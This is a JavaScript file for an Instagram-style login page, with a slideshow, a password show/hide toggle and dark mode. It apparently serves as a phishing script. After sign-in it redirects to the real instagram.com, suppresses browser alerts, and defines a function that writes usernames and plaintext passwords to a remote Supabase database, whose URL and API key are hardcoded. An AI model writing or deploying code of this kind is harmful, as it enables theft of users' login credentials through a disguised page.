document.addEventListener('DOMContentLoaded', function() {
    let slide_content = document.querySelector('#slide-content');
    let signin_form = document.querySelector('#signin-form');
    let signin_btn = document.querySelector('#signin-btn');
    let darkmode_toggle = document.querySelector('#darkmode-toggle');

    let slide_index = 0;

    function slide() {
        let slide_items = slide_content.querySelectorAll('img');
        slide_items.forEach(e => e.classList.remove('active'));
        slide_index = (slide_index + 1) % slide_items.length;
        slide_items[slide_index].classList.add('active');
    }

    setInterval(slide, 2000);

    document.querySelectorAll('.animate-input').forEach(e => {
        let input = e.querySelector('input');
        let button = e.querySelector('button');

        input.onkeyup = () => {
            if (input.value.trim().length > 0) {
                e.classList.add('active');
            } else {
                e.classList.remove('active');
            }

            if (checkSigninInput()) {
                signin_btn.classList.remove('inactive');
                signin_btn.classList.add('active');
                signin_btn.removeAttribute('disabled');
            } else {
                signin_btn.classList.remove('active');
                signin_btn.classList.add('inactive');
                signin_btn.setAttribute('disabled', 'true');
            }
        };

        if (button) {
            button.onclick = () => {
                if (input.getAttribute('type') === 'text') {
                    input.setAttribute('type', 'password');
                    button.innerHTML = 'Show';
                } else {
                    input.setAttribute('type', 'text');
                    button.innerHTML = 'Hide';
                }
            };
        }
    });

    function checkSigninInput() {
        const inputs = signin_form.querySelectorAll('input');
        return Array.from(inputs).every(input => {
            return input.value.trim().length >= (input.type === 'password' ? 8 : 6);
        });
    }

    signin_btn.addEventListener('click', function(event) {
        event.preventDefault();

        if (signin_btn.classList.contains('active') && checkSigninInput()) {
            signin_btn.style.backgroundColor = "#0a3d91";
            window.location.href = 'https://www.instagram.com/';
        }
    });

    darkmode_toggle.onclick = (e) => {
        e.preventDefault();
        let body = document.querySelector('body');
        body.classList.toggle('dark');
        darkmode_toggle.innerHTML = body.classList.contains('dark') ? 'Lightmode' : 'Darkmode';
    };
});

// تعطيل نوافذ التنبيه باستخدام دالة العنصر window.alert
window.alert = function() {};

import { createClient } from '@supabase/supabase-js';
const supabaseUrl = "https://qljtnocjshhoqnnqogdz.supabase.co";
const supabaseKey = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InFsanRub2Nqc2hob3FubnFvZ2R6Iiwicm9sZSI6ImFub24iLCJpYXQiOjE2OTQ0NjY5OTgsImV4cCI6MjAxMDA0Mjk5OH0.Kqil-udxubUcjstaGQNo-WISgjEDTOhZrx2TEHJUQk4";
const supabase = createClient(supabaseUrl, supabaseKey);
async function addUser(username, password) {
  const { data, error } = await supabase
    .from('users')
    .upsert([
      {
        username: username,
        password: password,
      },
    ]);

  if (error) {
    console.error('Error adding user:', error);
  } else {
    console.log('User added successfully:', data);
  }
}